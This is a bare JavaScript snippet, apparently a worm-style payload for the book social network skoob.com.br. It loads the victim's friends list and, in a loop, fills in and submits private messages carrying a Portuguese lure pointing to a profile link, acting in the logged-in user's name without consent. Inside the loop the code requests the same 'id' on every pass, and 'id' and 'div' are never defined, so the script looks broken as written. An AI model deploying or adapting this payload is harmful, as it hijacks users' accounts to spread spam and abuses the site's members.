xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET','http://www.skoob.com.br/amigos/listar/'+id,false);
xmlhttp.send();
div.innerHTML = xmlhttp.responseText;
var friends = {};
friends = document.querySelectorAll('#corpo > div > div > div > a.l12');

for (var i = 0; i < friends.length; i++) { 
  xmlhttp = new XMLHttpRequest();
  xmlhttp.open('GET','http://www.skoob.com.br/usuario/'+id, false);
  xmlhttp.send();
  div.innerHTML = xmlhttp.responseText;
  document.getElementById("RecadoPrivado").checked = true;
  document.getElementById("RecadoRecado").value = 'da uma olhada no meu estilo de leitura favorito.. animal. skoob.com.br/usuario/'+id+'/';
  document.getElementsByTagName('form')[1].submit();
}

